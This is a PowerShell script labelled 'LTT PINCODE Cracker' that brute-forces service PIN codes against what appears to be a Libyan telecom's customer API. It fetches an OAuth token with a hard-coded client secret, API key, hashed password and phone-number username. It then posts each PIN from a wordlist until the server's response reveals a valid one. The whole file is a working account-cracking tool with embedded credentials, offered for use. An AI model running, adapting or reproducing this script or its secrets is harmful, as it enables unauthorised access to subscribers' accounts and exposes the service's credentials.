Add-Type -AssemblyName System.Net.Http
Add-Type -AssemblyName System.Web
function Token
{
    $URL = "https://api.myltt.ltt.ly/oauth/token"
    $passd = "F8258A535F1D84A78D1F32792356B9A2F52C2D846DE2A4BF18388421AF4D64AB63B6350B6CFBDB105933BF2D3C0E05E66955611ECB12F5115EBF4D14A90C84C6"
    $GrantType = "password"
    $ClientSecret = "Q0O2V2yQdCep9nj7qYXxGOOnck4m0RfDbCOzUsTp"
    $ClientId = "429081"
    $usern = "0927103310+354772086688146"
    $Body = New-Object System.Net.Http.MultipartFormDataContent
        $PASSDValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
        $PASSDValue.Name = """password"""
        $PASSDContent = New-Object System.Net.Http.StringContent $passd
        $PASSDContent.Headers.ContentLength = $passd.Length
        $PASSDContent.Headers.Remove("Content-Type") | Out-Null
        $PASSDContent.Headers.ContentDisposition = $PASSDValue
        $Body.Add($PASSDContent)
        
        $GrantTypeValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
        $GrantTypeValue.Name = """grant_type"""
        $GrantTypeContent = New-Object System.Net.Http.StringContent $GrantType
        $GrantTypeContent.Headers.ContentLength = $GrantType.Length
        $GrantTypeContent.Headers.Remove("Content-Type") | Out-Null
        $GrantTypeContent.Headers.ContentDisposition = $GrantTypeValue
        $Body.Add($GrantTypeContent)
        
        $ClientSecretValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
        $ClientSecretValue.Name = """client_secret"""
        $ClientSecretContent = New-Object System.Net.Http.StringContent $ClientSecret
        $ClientSecretContent.Headers.ContentLength = $ClientSecret.Length
        $ClientSecretContent.Headers.Remove("Content-Type") | Out-Null
        $ClientSecretContent.Headers.ContentDisposition = $ClientSecretValue
        $Body.Add($ClientSecretContent)
        
        $ClientIdValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
        $ClientIdValue.Name = """client_id"""
        $ClientIdContent = New-Object System.Net.Http.StringContent $ClientId
        $ClientIdContent.Headers.ContentLength = $ClientId.Length
        $ClientIdContent.Headers.Remove("Content-Type") | Out-Null
        $ClientIdContent.Headers.ContentDisposition = $ClientIdValue
        $Body.Add($ClientIdContent)
        
        $usernValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
        $usernValue.Name = """username"""
        $usernContent = New-Object System.Net.Http.StringContent $usern
        $usernContent.Headers.ContentLength = $usern.Length
        $usernContent.Headers.Remove("Content-Type") | Out-Null
        $usernContent.Headers.ContentDisposition = $usernValue
        $Body.Add($usernContent)
    
        
             $Handler = New-Object System.Net.Http.HttpClientHandler
             $Client = New-Object System.Net.Http.Httpclient $Handler
             $Client.DefaultRequestHeaders.Add("X-API-KEY", "UiFqpG0eZra3XfwzWFE7dNJP9B9ql6ZRA5kiSTBk")
             $Client.DefaultRequestHeaders.Add("Connection", "Keep-Alive")
             $Client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip")
             $Client.DefaultRequestHeaders.Add("User-Agent", "okhttp/3.11.0")
             $Client.DefaultRequestHeaders.ExpectContinue = $false
             $response = $Client.PostAsync($URL,$Body).Result
             $token = ($response.Content.ReadAsStringAsync().Result | ConvertFrom-Json).access_token
             return $token
}
function Invoke-LTT-Cracker
{

    [CmdletBinding()] Param(
    [Parameter(Mandatory = $true)]
    [Alias('PINs')]
    [String]$PIN   

)
Clear-Host
Write-Host @"
--------------------------------
       LTT PINCODE Cracker            
--------------------------------
"@
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
$user = Read-Host –Prompt "[-] Enter Username"
$pass = Read-Host –Prompt "[-] Enter Password"
Write-Host "[-] Start Cracking..."
$PINs = Get-Content -ErrorAction SilentlyContinue -Path $PIN
$URL = "https://api.myltt.ltt.ly/v1/account/services"
$token = Token
$ServiceType = "7"
$Number = [string]::Empty
$Ltepin = [string]::Empty
$Name = "Ali"

foreach ($PINCODE in $PINs) 
{
    $Body = New-Object System.Net.Http.MultipartFormDataContent

    $NumberValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
    $NumberValue.Name = """number"""
    $NumberContent = New-Object System.Net.Http.StringContent $Number
    $NumberContent.Headers.ContentLength = $Number.Length
    $NumberContent.Headers.Remove("Content-Type") | Out-Null
    $NumberContent.Headers.ContentDisposition = $NumberValue
    $Body.Add($NumberContent)

    $PASSValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
    $PASSValue.Name = """password"""
    $PASSContent = New-Object System.Net.Http.StringContent $pass
    $PASSContent.Headers.ContentLength = $pass.Length
    $PASSContent.Headers.Remove("Content-Type") | Out-Null
    $PASSContent.Headers.ContentDisposition = $PASSValue
    $Body.Add($PASSContent)

    $ServiceTypeValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
    $ServiceTypeValue.Name = """service_type"""
    $ServiceTypeContent = New-Object System.Net.Http.StringContent $ServiceType
    $ServiceTypeContent.Headers.ContentLength = $ServiceType.Length
    $ServiceTypeContent.Headers.Remove("Content-Type") | Out-Null
    $ServiceTypeContent.Headers.ContentDisposition = $ServiceTypeValue
    $Body.Add($ServiceTypeContent)

    $NameValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
    $NameValue.Name = """friendly_name"""
    $NameContent = New-Object System.Net.Http.StringContent $Name
    $NameContent.Headers.ContentLength = $Name.Length
    $NameContent.Headers.Remove("Content-Type") | Out-Null
    $NameContent.Headers.ContentDisposition = $NameValue
    $Body.Add($NameContent)

    $PINValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
    $PINValue.Name = """pin"""
    $PINContent = New-Object System.Net.Http.StringContent $PINCODE
    $PINContent.Headers.ContentLength = $PINCODE.Length
    $PINContent.Headers.Remove("Content-Type") | Out-Null
    $PINContent.Headers.ContentDisposition = $PINValue
    $Body.Add($PINContent)

    $LtepinValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
    $LtepinValue.Name = """lte_pin"""
    $LtepinContent = New-Object System.Net.Http.StringContent $Ltepin
    $LtepinContent.Headers.ContentLength = $Ltepin.Length
    $LtepinContent.Headers.Remove("Content-Type") | Out-Null
    $LtepinContent.Headers.ContentDisposition = $LtepinValue
    $Body.Add($LtepinContent)

    $USERValue = New-Object System.Net.Http.Headers.ContentDispositionHeaderValue "form-data"
    $USERValue.Name = """username"""
    $USERContent = New-Object System.Net.Http.StringContent ($user + "@ltt.ly")
    $USERContent.Headers.ContentLength = ($user + "@ltt.ly").Length
    $USERContent.Headers.Remove("Content-Type") | Out-Null
    $USERContent.Headers.ContentDisposition = $USERValue
    $Body.Add($USERContent)
    
         $Handler = New-Object System.Net.Http.HttpClientHandler
         $Client = New-Object System.Net.Http.Httpclient $Handler
         $Client.DefaultRequestHeaders.Add("X-API-KEY", "UiFqpG0eZra3XfwzWFE7dNJP9B9ql6ZRA5kiSTBk")
         $Client.DefaultRequestHeaders.Add("Authorization", "Bearer " + $token)
         $Client.DefaultRequestHeaders.Add("Connection", "Keep-Alive")
         $Client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip")
         $Client.DefaultRequestHeaders.Add("User-Agent", "okhttp/3.11.0")
         $Client.DefaultRequestHeaders.ExpectContinue = $false
    
    $request = $Client.PostAsync($URL,$Body).Result       
    
    if([int]$request.StatusCode -eq 200 -or [int]$request.StatusCode -eq 400 -and $request.Content.ReadAsStringAsync().Result -match "SERVICE_ACCOUNT_ALREADY_ASSOCIATED")
{   
    Write-Host "[+] PINCODE Found:" -NoNewline;Write-Host $PINCODE -ForegroundColor Green
    Start-Sleep -s 4
    $open = Read-Host "[+] Open E-Care To Check (Y/N)"
    if ($open -eq 'Y') {
    Write-Host "[+] Opening E-Care..."
    Start-Sleep -s 5
    [System.Diagnostics.Process]::Start("chrome.exe","https://clientstatus.ltt.ly/nser/") | Out-Null    
}
    break
  
    }
  }
}
